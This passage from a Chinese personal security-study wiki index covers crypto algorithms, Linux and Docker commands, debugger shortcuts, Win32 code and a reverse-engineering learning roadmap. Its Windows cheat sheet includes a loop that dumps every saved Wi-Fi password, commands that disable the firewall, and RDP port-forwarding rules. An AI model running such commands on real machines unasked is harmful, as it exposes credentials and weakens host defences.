c_2(c_1^d)^{-1}&amp;\\equiv my^k(\\alpha^{d\\ k}）^{-1}\\ mod\\ p\\\\ &amp;\\equiv my^k(y^k)^{-1}\\ mod\\ p\\quad【y^k(y^k)^{-1}约掉】\\\\ &amp;\\equiv m\\ mod\\ p \\end{split}\\end{equation}"},{"title":"RSA","path":"/wiki/cryptography/RSA.html","content":"前置知识 欧拉函数 n：一正整数 ψ(n)\\psi(n)ψ(n)：小于n且与n互为素数的正整数的个数 特殊地 若p为素数，则ψ（n）\\psi（n）ψ（n）=p-1 那么，对于两个素数p和q，记它们的乘积n=qp，则有ψ(n)=(p−1)(q−1)\\psi(n)=(p-1)(q-1)ψ(n)=(p−1)(q−1) 例子 求ψ(6)\\psi(6)ψ(6)。比6小且与6互素的正整数有{1，5}两个，所以ψ(6)=2\\psi(6)=2ψ(6)=2 求ψ(21)\\psi(21)ψ(21)。 法:1：比21小而且比21互素的正整数有{1,2,4,5,8,10,11,13,16,17,19,20}共12个 法2：21=3×7（3和7都是素数），所以ψ(21)=(3−1)×(7−1)=12\\psi(21)=(3-1)×(7-1)=12ψ(21)=(3−1)×(7−1)=12 费马定理 p：素数；a：正整数；且gcd（a，p）=1（即a和p互素），则ap−1≡1 mod pa^{p-1}\\equiv1\\ mod\\ pap−1≡1 mod p RSA RSA笔记脉络{参数定义和密钥生成加密算法解密算法RSA笔记脉络\\begin{cases} 参数定义和密钥生成\\\\ 加密算法\\\\ 解密算法 \\end{cases} RSA笔记脉络⎩⎪⎪⎨⎪⎪⎧​参数定义和密钥生成加密算法解密算法​ 1. 参数定义和密钥生成 （1）选两个大素数p和q；（p，q保密） （2）计算n=pq，ψ(n)=(p−1)×(q−1)\\psi(n)=(p-1)×(q-1)ψ(n)=(p−1)×(q−1)；（n公开，ψ(n)\\psi(n)ψ(n)保密） （3）随即选一整数e，要求满足1&lt;e&lt;ψ(n)1&lt;e&lt;\\psi(n)1&lt;e&lt;ψ(n)且gcd(e,ψ(n))=1gcd(e,\\psi(n))=1gcd(e,ψ(n))=1；（e公开） （4）计算d，要求满足e×d≡1(modψ(n))e\\times d\\equiv1(mod\\psi(n))e×d≡1(modψ(n))，即 d≡e−1(modψ(n)) d\\equiv e^{-1}(mod\\psi(n)) d≡e−1(modψ(n)) ​\t因为在（3）中选e时e就是要与ψ(n)\\psi(n)ψ(n)互素，所以e的乘法逆元一定存在 ​ （d保密） p、q、ψ(n)\\psi(n)ψ(n)可以销毁，但不能泄露 2. 加密算法 加密时首先将明文比特串分组，使得每个分组对应的十进制数小于n，即分组长度小于log2nlog_2nlog2​n，然后对每个明文分组m，作加密运算得密文c c≡me(mod n) c\\equiv m^e(mod\\ n) c≡me(mod n) 3. 解密算法 对密文分组进行解密运算得明文m m≡cd(mod n) m\\equiv c^d(mod\\ n) m≡cd(mod n)"},{"title":"ZUC","path":"/wiki/cryptography/ZUC.html","content":"见pdf"},{"title":"SM4","path":"/wiki/cryptography/SM4.html","content":"参考网址 http://www.mamicode.com/info-detail-2603734.html https://blog.csdn.net/cg129054036/article/details/83016958 总体流程 SM4是对称密钥中的分组密码 密钥标准长度 和 分组固定长度 都为128bit，所以每组的输出也为128bit SM4是对“字”友好的算法，一个字节长度为8bit，一个字长度为4个字节，也就是32bit。SM4算法中，32bit的操作非常多，一方面是为了提高运行效率，另一方面也是为了一次性处理整数个字时的方便。 一些参数(以下每个变量表示一个字) 主密钥(128bit)：MK=(MK0,MK1,MK2,MK3)MK=(MK_0,MK_1,MK_2,MK_3)MK=(MK0​,MK1​,MK2​,MK3​) 轮密钥(128bit)：(rk0,rk1,⋯ ,rk31)(rk_0,rk_1,\\cdots,rk_{31})(rk0​,rk1​,⋯,rk31​)，轮密钥由加密密钥生成 系统参数(128bit)：FK=(FK0,FK1,FK2,FK3)FK=(FK_0,FK_1,FK_2,FK_3)FK=(FK0​,FK1​,FK2​,FK3​)，用于密钥扩展算法 固定参数(128bit)：CK=(CK0,CK1,⋯ ,CK31)CK=(CK_0,CK_1,\\cdots,CK_{31})CK=(CK0​,CK1​,⋯,CK31​) SM4算法加密流程图： SM4算法示意图（将轮函数也放进去）： 详细过程 SM4笔记脉络{轮函数F{合成置换T{非线性变换τ—S盒线性变换L密钥拓展算法反序变换SM4笔记脉络\\begin{cases} 轮函数F\\begin{cases} 合成置换T\\begin{cases} 非线性变换\\tau—S盒\\\\ 线性变换L \\end{cases} \\end{cases}\\\\ 密钥拓展算法\\\\ 反序变换 \\end{cases} SM4笔记脉络⎩⎪⎪⎪⎪⎨⎪⎪⎪⎪⎧​轮函数F{合成置换T{非线性变换τ—S盒线性变换L​​密钥拓展算法反序变换​ 1. 轮函数F（32轮） 整体加密函数： \\begin{equation}\\begin{split} X_{i+4}&amp;=F(X_1,X_{i+1},X_{i+2},X_{i+3},rk_i)\\\\ &amp;=X_i⊕T(X_{i+1},X_{i+2},X_{i+3}⊕rk_i)\\\\ &amp;i=0,1,\\cdots,31\\\\ &amp;这个是每一轮函数前最右边的那个X\\\\ &amp;前面三个X是由上一轮的后三个左移得到 \\end{split}\\end{equation} ​\tSM4的轮函数F将输入部分看做了4个32bit长度的数据，每轮的后3个部分都向左移动32bit的数据长度，作为进行下一轮函数的前三个输入。 ​\t这三组数据异或后进入非线性部分τ和线性部分L，运算后的结果与第一组数据异或并置于最右面。 ​\t如此循环往复32轮，也就是数据一共左移了8个周期，将其中的混乱因素不断扩散至每个bit位中。 ​\t最后将4段数据反序置放，如此才能在解密时重复利用现有的结构。 （1）合成置换T ​\tT：Z232→Z232T：Z^{32}_{2}\\rightarrow Z^{32}_{2}T：Z232​→Z232​，是一个可逆变换，由非线性变换τ\\tauτ和线性变换L复合而成 T(⋅)=L(τ(⋅)) T(\\cdot)=L(\\tau(\\cdot)) T(⋅)=L(τ(⋅)) ①非线性变换τ\\tauτ ​\t这个部分由4个平行的8bit进8bit输出的S盒组成。 ​\t这里使用的S盒是一种256个数到256个数的映射，因为其具有较好的非线性程度等良好的密码学性质，比较适合用作数据混乱的核心工具。 ​\t用公式表达τ\\tauτ函数为： (b0,b1,b2,b3)=τ(A)=(Sbox(a0),Sbox(a1)，Sbox(a2)，Sbox(a3) ) (b_0,b_1,b_2,b_3)=\\tau(A)=(Sbox(a_0),Sbox(a_1)，Sbox(a_2)，Sbox(a_3)\\ ) (b0​,b1​,b2​,b3​)=τ(A)=(Sbox(a0​),Sbox(a1​)，Sbox(a2​)，Sbox(a3​) ) 其中，输入为A=(a0,a1,a2,a3)A=(a_0,a_1,a_2,a_3)A=(a0​,a1​,a2​,a3​) 输出为B=(b0,b1,b2,b3)B=(b_0,b_1,b_2,b_3)B=(b0​,b1​,b2​,b3​) ​ ​\tS盒如下表所示，S盒中的数据均采用十六进制数表示。 ​\t设S盒的输入为EF，则经S盒运算的输出结果为表中第E行、第F列的值，即Sbox(EF)=0x84 ​\t经过4个S盒进行非线性映射后的数据，与原数据没有直观的数学关系，是抵抗线性分析非常有效的工具。 ②线性变换L 非线性变换$\\tau$的输出作为线性变换L的输入 \\begin{equation}\\begin{split} C&amp;=L(B)\\\\ &amp;=B⊕(B&lt;&lt;&lt;2)⊕⊕(B&lt;&lt;&lt;10)⊕(B&lt;&lt;&lt;18)⊕(B&lt;&lt;&lt;24) \\end{split}\\end{equation} ​\t直观解释为将B（τ函数的输出值，32bit）分别左移2,10,18,24比特后，与其自身一同异或，即可将比特位影响到其它位置。 ​\t【&lt;&lt;&lt;表示向左循环移位】像移位、异或等这些操作都属于线性运算，硬件实现方便，软件实现同样高效，作为密码算法中辅助混乱扩散的重要部分，在算法中大量普遍存在。 2. 密钥拓展算法 ​\t这看上去是不是和轮密钥的结构是一样？ ​\t这样在硬件实现上避免了单独制作一个轮密钥扩展电路，降低了电路门数，是一种不错的解决方法。 ​\t这种结构生成的轮密钥是非线性度较高的，系统参数还能确保SM4算法在不同的应用环境中隔离使用，不同的系统中使用不同的系统参数，即使使用相同的密钥也无法加密加密，无法正常通信。 轮密钥生成方法： (K_0,K_1,K_2,K_3)=(MK_0⊕FK_0,MK_1⊕FK_1,MK_2⊕FK_2,MK_3⊕FK_3)\\\\[2ex] \\begin{equation}\\begin{split} rk_{i}&amp;=K_{i+4}\\\\ &amp;=K_i⊕T&#039;(K_{i+1},K_{i+2},K_{i+3},CK_i)\\\\ \\end{split}\\end{equation} 其中，T′(⋅)=L′(τ(⋅))T&#x27;(\\cdot)=L&#x27;(\\tau(\\cdot))T′(⋅)=L′(τ(⋅))，τ\\tauτ变换与加密轮函数中的相同，只是线性变换L变为L’ L′(B)=B⊕(B&lt;&lt;&lt;13)⊕(B&lt;&lt;&lt;23)L&#x27;(B)=B⊕(B&lt;&lt;&lt;13)⊕(B&lt;&lt;&lt;23) L′(B)=B⊕(B&lt;&lt;&lt;13)⊕(B&lt;&lt;&lt;23) 系统参数FK取值固定，用十六进制数表示： FK=(FK0,FK1,FK2,FK3)FK=(FK_0,FK_1,FK_2,FK_3)FK=(FK0​,FK1​,FK2​,FK3​) FK0=(A3B1BAC6)FK_0=(A3B1BAC6)FK0​=(A3B1BAC6) FK1=(56AA3350)FK_1=(56AA3350)FK1​=(56AA3350) FK2=(677D9197)FK_2=(677D9197)FK2​=(677D9197) FK3=(B27022DC)FK_3=(B27022DC)FK3​=(B27022DC) (没讲)固定参数CK这样来取：设ckij为CKi的第j个字节(i=0,1,⋯ ,31;j=0,1,2,3)ck_{ij}为CK_i的第j个字节(i=0,1,\\cdots,31;j=0,1,2,3)ckij​为CKi​的第j个字节(i=0,1,⋯,31;j=0,1,2,3)，即CKi=(cki,0,cki,1,cki,2,cki,3)CK_i=(ck_{i,0},ck_{i,1},ck_{i,2},ck_{i,3})CKi​=(cki,0​,cki,1​,cki,2​,cki,3​)，则ckij=(4i+j)×7（mod256)ck_{ij}=(4i+j)\\times7（mod256)ckij​=(4i+j)×7（mod256) ​\t32个固定参数CK的十六进制表示形式具体值：00070E15，1C232A31，383F464D，545B6269，70777E85，8C939AA1，A8AFB6BD，C4CBD2D9，E0E7EEF5，FC030A11，181F262D，343B4249，50575E65，6C737A81，888F969D，A4Abb2b9，C0C7CEd5，DCE3EAF1，F8FF060d，141B2229，30373E45，4C535A61，686F767D，848B9299，A0A7AEB5，BCC3CAD1，D8DFE6ED，F4FB0209，10171E25，2C333A41，484F565D，646B7279。 3. 反序变换 是不是忘了写？"},{"title":"Linux","path":"/wiki/essentials_os_tools/Linux.html","content":"网络相关 静态IP CentOSUbuntu网卡配置文件在/etc/sysconfig/network-scripts下 1cd /etc/sysconfig/network-scripts 例，ens33是网卡名1vi ifcfg-ens33 配置文件例1234567891011121314151617181920TYPE=EthernetPROXY_METHOD=noneBROWSER_ONLY=noBOOTPROTO=staticDEFROUTE=yesIPV4_FAILURE_FATAL=noIPV6INIT=yesIPV6_AUTOCONF=yesIPV6_DEFROUTE=yesIPV6_FAILURE_FATAL=noNAME=ens33#UUID=918aeb73-c766-4e4d-b882-fccefe3fae07#DEVICE=eth0ONBOOT=yesHWADDR=00:0c:29:45:ca:1e#IPADDR=192.168.92.124#GATEWAY=192.168.92.1IPADDR=192.168.147.161GATEWAY=192.168.147.1NETMASK=255.255.255.0 修改后，重启网卡或重启网络 重启网卡1sudo ifdown ens33 &amp;&amp; sudo ifup ens33 重启网络1sudo systemctl restart network待补充 docker相关 待整理12345678910111213141516171819202122232425262728293031systemctl start docker检查IP地址和端口转发docker inspect graybox-java-webserver --format &#x27;&#123;&#123; .NetworkSettings.Ports &#125;&#125;&#x27;docker inspect graybox-java-webserver --format &#x27;&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;&#x27;docker start phpenvfirewall-cmd --list-all进入容器内部，直接用curl检查Web服务是否在内部正常工作docker exec -it graybox-java-webserver curl http://localhost:80docker inspect phpenvdocker logs phpenvdocker exec phpenv ps auxdocker exec phpenv envdocker restart graybox-java-webserverfind / -type f -name &quot;install.sh&quot;docker exec -it ID名称 /bin/bashnetstat -tulnp | grep :80docker exec -it graybox-java-webserver bashnetstat -tulpn | grep :80"},{"title":"PE Tools","path":"/wiki/essentials_os_tools/PE_Tools.html","content":"查看dll中导出的函数 Dependency Walker 注：只支持Windows 95, 98, Me, NT, 2000, XP, 2003, Vista, 7, and 8下32/64位模块的分析，2006年后已停止更新 装完VC6有一块装，在开始菜单那可以找到。或安装目录\\Microsoft Visual Studio\\Common\\Tools文件夹下 或独立下载安装 Dependencies 开源的，升级版的Dependency Walker，支持win10 VS的dumpbin 进入VS开发环境，然后Tools -&gt; 开发者命令提示 cd到dll所在目录，用以下命令看到a.dll的所有导出函数 1dumpbin /exports a.dll 绝对路径1dumpbin /exports “C:\\Windows\\System32\\user32.dll” 或在VS安装目录\\VC\\bin\\下找到dumpbin.exe"},{"title":"Tools","path":"/wiki/essentials_os_tools/Tools.html","content":"http服务 python2起http服务，默认使用端口8000 1python -m SimpleHTTPServer [port] python3起http服务，默认使用端口8000 1python -m http.server [port] curl 代理功能 参考：https://aiezu.com/article/linux_curl_proxy_http_socks.html 参数 用法 -x host:port -x [protocol://[user:pwd@]host[:port] --proxy [protocol://[user:pwd@]host[:port] 使用HTTP代理访问；如果未指定端口，默认使用8080端口; protocol默认为http_proxy，其他可能的值包括： http_proxy、HTTPS_PROXY、socks4、socks4a、socks5； 如： --proxy 8.8.8.8:8080； -x “http_proxy://aiezu:123@aiezu.com:80” 比如：带认证的socks5代理 1curl -x socks5://admin:admin@192.168.199.146:7777 http://192.168.199.151:8089/ 不带认证的socks5代理 1curl -x socks5://192.168.199.146:7777 http://192.168.199.151:8089/ 使用curl下载一个二进制文件时终端回显： 1234SF01V_VM01_SFOS 19.5.1 MR-1-Build278# curl 192.168.242.129:8080/textWarning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tellWarning: curl to output it to your terminal anyway, or consider &quot;--outputWarning: &lt;FILE&gt;&quot; to save to a file. 原因： text是一个二进制文件，curl它会输出二进制文件，这会mess up your terminal。 如果确定要继续输出，用--output -输这条命令： 1curl --output - 192.168.242.129:8080/text 如果是想保存为文件，用--output &lt;FILE&gt;保存为文件，缩写是-o，如下面这条命令： 1curl 192.168.242.129:8080/text -o text"},{"title":"Vim","path":"/wiki/essentials_os_tools/Vim.html","content":"命令模式（Command Mode） 刚启动vi/vim，进入的就是命令模式 i – 在当前光标位置开始输入文本，进入到输入模式 o – 在当前行的下方插入一个新行，进入到输入模式 光标移动： G – 移动到这个文件的最后一行 $ 或功能键[End] – 移动到这一行的最后面字符处 删除： dd – 剪切游标所在的那一整行(常用)，用 p/P 可以粘贴（可以拿来当删除用） 撤销还原： u – 复原前一个动作 [Ctrl]+r – 重做上一个动作 退出： :w – 保存文件 :q – 退出 Vim 编辑器 :q! – 强制退出Vim 编辑器，不保存修改。 可组合成 :wq – 保存文件并退出 Vim 编辑器 参考链接🔗 Linux vi/vim-菜鸟教程"},{"title":"Software Analysis","path":"/wiki/essentials_os_tools/Software_Analysis.html","content":"调试器 Ollydbg 反汇编窗口区 F2，普通断点 F4，相当于F2，F9，F2 F7，单步步入 F8，单步步过 F9，执行程序 调窗口程序： 消息断点条件1[esp+8]==WM_LBUTTONDOWN 子窗口断点 子窗口断点1[esp+8]==WM_COMMAND 子窗口断点+具体的子窗口ID1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3EB 刚进入回调函数时的堆栈布局： ESP 返回地址 hwnd uMsg wParam lParam ;，注释 选中一段反汇编/数据，Ctrl+A重新分析（相当于右键菜单分析-重新分析） 堆栈区 右键，锁定/解锁堆栈 静态分析 IDA A、C、D、U G：跳转指令 Alt+T：搜索指令 注释 ; ： 交叉引用x 待整理"},{"title":"Windows","path":"/wiki/essentials_os_tools/Windows.html","content":"cheat sheet 计算文件MD5值 1certutil -hashfile demo.txt MD5 忘记用户密码，用runas验证 1runas /user:test whoami 会让输入test用户的密码，正确就回显 netsh端口转发 参考链接🔗：windows命令行下用netsh实现端口转发(端口映射) 管理员cmd，查看已存在的转发1netsh interface portproxy show all 列出所有接口以确认接口名称1netsh interface ipv4 show interfaces 启用某个网卡的IP路由转发 假设某个网卡名称是“WLAN”1netsh interface ipv4 set interface &quot;WLAN&quot; forwarding=enabled 需要将192.168.204.150的3389端口转发到3340端口，则需要在192.168.204.150主机的命令行输入该语句 1netsh interface portproxy add v4tov4 listenport=3340 listenaddress=192.168.204.150 connectport=3389 connectaddress=192.168.204.150 如果要将传入的TCP连接转发至另一台计算机： 1netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.100.101 删除指定规则 1netsh interface portproxy delete v4tov4 listenport=3340 listenaddress=192.168.204.150 使用netstat确保3340端口当前处于被侦听状态： 1netstat -ano | findstr :3340 清除所有当前的端口转发规则 1netsh interface portproxy reset 关闭防火墙 禁用系统防火墙1netsh firewall set opmode disable 启用防火墙 1netsh firewall set opmode enable 批处理语句 多次执行程序 cmd版1for /l %i in (1,1,50) do start &quot;&quot; &quot;test.exe&quot; bat版本，多一个%1for /l %%i in (1,1,50) do start &quot;&quot; &quot;GiftBoxHTTPLoaderGenerate.exe&quot; 多次复制一个程序 1for /l %i in (1,1,2) do copy xxx.exe xxx%i.exe 在一个文件夹下创建多个有规律的文件夹 记事本记得另存为ANSI，否则创建出的文件夹会乱码123456@echo offfor /L %%i in (1,1,11) do ( mkdir 第%%i个文件夹)echo 文件夹创建完成。pause 获取wifi密码 显示电脑连接过的所有WIFI记录配置信息 普通cmd1netsh wlan show profile 输出要查看的wifi的对应密码1netsh wlan show profiles name=&quot;WiFi名称&quot; key=clear 显示电脑所有曾经连接过的Wi-Fi密码1for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 123 123 123 出错解决 win server2008/win server2012运行程序报丢失Wlanapi.dll 解决办法：添加功能-安装无线LAN服务（Wireless LAN Service），安装后可能需要重启 参考链接🔗： 解决windows server 2008 r2 安装钉钉客户端缺少wlanapi.dll文件的提示 Windows2008R2系统下丢失wlanapi.dll问题的解决 知识类 微软操作系统列表-Wiki百科（下拉到最后的表格） 关闭defender：https://zhuanlan.zhihu.com/p/39959842"},{"title":"Visual Studio","path":"/wiki/essentials_os_tools/Visual_Studio.html","content":"通用知识 解决方案与项目的区别 一个解决方案中多个项目+分别如何编译 visual studio在一个解决方案(solution)中是可以添加多个项目(project）的，这多个项目之间存在两种关系： 项目间彼此独立，各自有各自的入口，只是组织在一个解决方案中便于管理 项目间存在相互调用，只存在一个入口。这对于多种语言混编的管理特别方便。 对解决方案重命名： Visual studio 解决方案和项目名称创建与修改 快捷键 Ctrl+K，Ctrl+C，注释 Ctrl+K，Ctrl+U，取消注释 调试： F10步过 F11，步入 配置 去除pdb信息：https://blog.csdn.net/typ2004/article/details/22826657 关闭ASLR：https://blog.csdn.net/HappyBear1995/article/details/51126998 静态编译：https://blog.csdn.net/u012308586/article/details/94733155 C/C+±&gt;代码生成-&gt;运行库，带d的是debug 插件 Folder To Solution Folder：添加物理目录为解决方案目录 看这篇文章发现的：https://www.cnblogs.com/Kit-L/p/13888534.html"},{"title":"Windows via C/C++","path":"/wiki/essentials_os_tools/Windows_via_CC++.html","content":"wait functions等待函数 WaitForSingleObject123HANDLE hThread1 = CreateThread(NULL, NULL, ThreadProc, NULL, 0, NULL);WaitForSingleObject(hThread, INFINITE); WaitForMultipleObjects123456789101112131415// 创建多个线程HANDLE threads[4];for (int i = 0; i &lt; 4; i++)&#123; threads[i] = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);&#125;// 等待所有线程结束WaitForMultipleObjects(4, threads, TRUE, INFINITE);// 关闭线程句柄for (i = 0; i &lt; 4; i++)&#123; CloseHandle(threads[i]);&#125; 线程互斥 123456789101112131415CRITICAL_SECTION g_cs;void main()&#123; //初始化临界区资源 InitializeCriticalSection(&amp;g_cs); //进入临界区 EnterCriticalSection(&amp;g_cs); /***临界区***/ //离开临界区 LeaveCriticalSection(&amp;g_cs); //删除临界区资源 DeleteCriticalSection(&amp;g_cs); &#125; 123456789101112// 创建互斥体HANDLE hMutex = CreateMutex(NULL, FALSE, &quot;XYZ&quot;);// HANDLE hMutex = CreateMutex(NULL, FALSE, NULL); //无名互斥体// 获取令牌WaitForSingleObject(hMutex, INFINITE);/***临界区***/// 释放令牌ReleaseMutex(hMutex);// 关闭句柄CloseHandle(hMutex); 对话框 对话框模板123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;Windows.h&gt;#include &quot;resource.h&quot;\t#include &lt;commctrl.h&gt;#pragma comment(lib,&quot;comctl32.lib&quot;)BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow // 控制窗口显示方式的标志)&#123; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG_MAIN), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: //对话框初始化的消息 &#123; return TRUE; &#125;\tcase WM_NOTIFY: //控件消息类型\t&#123; // auto pNMHDR = (NMHDR*)lParam; // if (wParam == IDC_LIST_PROCESS &amp;&amp; pNMHDR-&gt;code == NM_CLICK) //Process List控件 点击鼠标左键 // &#123; // //MessageBox(0, 0, 0, 0); //测一下 // EnumModules(GetDlgItem(hwndDlg, IDC_LIST_PROCESS), wParam, lParam); //函数：枚举进程中模块并显示在模块列表中 // &#125; return TRUE;\t&#125; case WM_COMMAND: //子窗口消息 switch (LOWORD(wParam)) &#123; case IDC_BUTTON_EXIT: //IDC_BUTTON_EXIT按钮 EndDialog(hwndDlg, 0); //关闭对话框 return TRUE; case IDC_BUTTON_START: //IDC_BUTTON_START按钮 HANDLE hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// 创建一个新线程作为工作线程，防止UI卡顿 CloseHandle(hWorkerThread); return TRUE; &#125; break; &#125; return FALSE;&#125;//工作线程DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; return 0;&#125; 子控件 设置编辑框中的值 123TCHAR szEditBuffer[0x80];GetDlgItemText(hwnd, (int)IDC_EDIT_1, szEditBuffer, 0x80); //获取编辑框中内容SetWindowText(hEdit, TEXT(&quot;1000&quot;)); //设置编辑框初始显示的值为1000 获取编辑框中的值 12345//1、获取文本框句柄hEditUser = GetDlgItem(hwndDlg, IDC_EDIT_USERNAME);//2、通过句柄得到里面的内容TCHAR szUserBuff[0x50];GetWindowText(hEditUser, szUserBuff, 0x50); 编辑框 从编辑框取值再放回 方式一12345678char buf[10] = &#123; 0 &#125;;int count;GetWindowText(hEdit, buf, 10); // 从编辑框读值count = atoi(buf); // 字符转数字//...对数值count进行处理sprintf(buf, &quot;%d&quot;, --count); // 数字转字符SetWindowText(hEdit, buf); // 设置编辑框的值 方式二123456789101112131415161718192021222324GetDlgItem(hDlg, IDC_EDIT_TIMER); //获取子窗口句柄GetWindowText(句柄, 数据缓冲区, 长度); //从编辑框获取文本sscanf(szBuffer, &quot;%d&quot;, &amp;dwTimer); //字符串转数字sprintf(数据缓冲区, &quot;%d&quot;, 数字); //数字转字符串SetWindowText(句柄, 数据缓存区); //设置编辑框文本----例GetDlgItem(hDlg, IDC_EDIT_TIMER); //获取子窗口句柄TCHAR szBuffer[256]; // 假设足够大以存储编辑框内容GetWindowText(hEdit, szBuffer, sizeof(szBuffer)); // 从编辑框获取文本int dwTimer;sscanf(szBuffer, &quot;%d&quot;, &amp;dwTimer); // 将获取的字符串转换为整数sprintf(szBuffer, &quot;%d&quot;, dwTimer); // 将整数格式化回字符串SetWindowText(hEdit, szBuffer); // 更新编辑框文本"},{"title":"前言","path":"/wiki/cybersecurity_learning/前言_安全技术学习心得.html","content":"前言 想起以前在校时学习逆向时遇到的困难：身边人学这个的太少，可供参考的资料太少（书籍绝版，网上文章良莠不齐）。现在已经过了那个阶段，对安全技术有了稍微清晰点的认知，遂想起一栏，写下一些学习的心得，还有记录一些学习资源，一是供后来者参考，二是供自己参考复盘。 关于标题，本来是想叫逆向学习心得的，但实际上，俺已经过了这个心结（后面会提到）。知识是网状的，很多技术是有共通之处，不是说学逆向就不用学其他的，最后还是决定起名为安全技术学习心得。但这个wiki里主要讲的还是逆向，或者说二进制安全方面的，注意是windows方面的。 更新记录 书籍、资料、技术会更新，像2021年左右00年左右的书籍几乎绝版了，但其实仍是有极大参考价值的。这里列出时间线，方便参考 2024 年 3 月 7 日新建安全技术学习心得的wiki，写了前言和学习路线及资源两个md"},{"title":"学习路线及资源","path":"/wiki/cybersecurity_learning/学习路线及资源.html","content":"注意 每个人的学习路线是不一样的，知识是网状的，学习路线成长路线是不同的。但如果你想学习某方面的知识，本文是一些相应可供参考的学习资源，如视频，书籍等。不在本文里的资源不代表不好，只是俺没使用过 基础 C语言 如果未来想在计算机领域有长足的发展，C语言是一门必须掌握好的语言，更何况做逆向研究。基础数据类型，分支循环结构体这些语法其实是很简单的，有些编程思维就能很快掌握。指针才是重点和灵魂，指针可以参考滴水三期视频讲解指针的部分进行学习。 视频：滴水三期 书籍📕： 书名 作者是国内/国外 出版年 原版or中文 备注 C Primer Plus 第6版 中文版 国外 2020年 中文版就可以了，不必追求原版。 C++ 有了C语言，其实就可以做很多事，但学了C++，写代码会更省力方便快捷。C++提供了很多帮助开发者快速开发的语法：继承、多态、模板、STL等。 注：记得学习目的，学C++很容易陷进去，无论多少时间都会被耗进去，以实用为准，冷门的知识点用时再查。 视频：滴水三期 书籍📕： 书名 作者是国内/国外 出版年 原版or中文 备注 Thinking in C++ 国外 2000年 推荐原版，中文有些地方翻译不咋地，但是看原文其实很清晰 适合掌握一定C++语法后看，会讲语法背后的设计、原理。浙大翁恺老师在网易云课堂的面向对象程序设计-C++视频可供参考，但相比于书知识点少很多。 编程规范：C++ Core Guidelines 源码展开：https://cppinsights.io/ 看反汇编，看中间文件：https://godbolt.org/ 汇编语言 俺之前学习过程是先看了王爽老师的《汇编语言》，然后是黑皮书汇编语言7th，将课后习题几乎都做了，对汇编语言掌握得很清晰。导致后面看的滴水三期汇编的部分几乎没什么新的体会。 视频：滴水三期 书籍📕： 书名 作者是国内/国外 出版年 原版or中文 备注 汇编语言（第4版） 国内 2020年 - 经典教材，讲得浅显易懂 汇编语言：基于x86处理器（原书第7版） 国外 2016年 中文即可 现在中文有第八版了 PE 可执行文件存放的数据格式和约定。 视频：滴水三期 书籍📕： 书名 作者是国内/国外 出版年 原版or中文 备注 《加密与解密》3th，PE章节 PE权威指南 代码是win32汇编写的，但对PE各种讲解很全 C++黑客编程解密，PE章节 windows api编程 想在windows平台下开发程序的，win32必学。对于想研究windows内核，想走逆向研究的，更是要精通win32。看知乎说过时了没人用了，更称MFC是“没饭吃”，画界面只是win32的一部分功能。win32包括以下知识： 字符 多线程，线程同步 窗口，windows消息机制，子窗口的使用 进程 内存管理 文件系统 内存映射 DLL 远程注入 模块隐藏 进程通信 HOOK（各种类型HOOK/绕过全代码校验等） 像进程，内存这些更是研究操作系统的基础。 学习Windows API窗口编程的主要目的是掌握消息机制。这包括了解消息是如何生成和处理的。一旦理解了这一点，剩下的主要就是查询文档。虽然原生的Windows窗口编程在实际开发中可能不够美观，也不常用，但它对于理解消息机制仍然很重要。这种理解对于学习更高级的框架MFC，是非常有帮助的。 视频：滴水三期 书籍📕（开发时查阅使用）： 书名 作者是国内/国外 出版年 原版or中文 备注 深入浅出Windows API程序设计 编程基础篇 国内 2022年? - 讲GUI界面的 深入浅出Windows API程序设计：核心编程篇 国内 2022年 - kernel32里的那些api Windows API开发详解 国内 2011年 - 文档📚：MSDN 硬编码 视频：滴水三期 工具书： 书名 俗称 如何下载 备注 Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 2 (2A, 2B, 2C, &amp; 2D): Instruction Set Reference, A-Z intel白皮书二卷 google搜，官网有下载链接 汇编指令和硬编码查阅工具书 中级 保护模式 视频：滴水海哥中级版（网上找，网盘资源） 参考书籍📕： 书名 作者是国内/国外 出版年 原版or中文 备注 x86汇编语言（第2版） 国内 2023年 - 上半章实模式看过王爽老师的汇编语言的话，可以很快翻过去；下半章可以看是白皮书的翻译+见解。这本书俺只翻过，具体如何没法评价，不过确实是国内保护模式少数能参考的书籍了。 工具书： 书名 俗称 如何下载 备注 Intel® 64 and IA-32 ArchitecturesSoftware Developer’s ManualVolume 3 (3A, 3B, 3C, &amp; 3D):System Programming Guide intel白皮书三卷 google搜，官网有下载链接 段页机制"},{"title":"Cisco ISE","path":"/wiki/network_security_devices_env/Cisco_ISE.html","content":"产品链接https://www.cisco.com/c/en/us/support/security/identity-services-engine/series.html#~tab-models 官方下载页面https://software.cisco.com/download/home/283801620/type/283802505/release/3.3.0?i=!pp 第三方的下载链接汇总https://sysin.org/blog/cisco-ise-3/ SNS 37x5：这是Cisco的特定硬件型号。 3.3.0：这是Cisco ISE的软件版本。 HP-3.2-CSCwf02093和HP-CSCwd45843：这些是特定的补丁和更新 要虚拟机安装的话，选择3.3.0里后缀为ovf文件。如果只是想进行评估，那么可以选择“ISE 3.3 OVA file - 300GB disk for Eval, Small, Medium (Recommend for 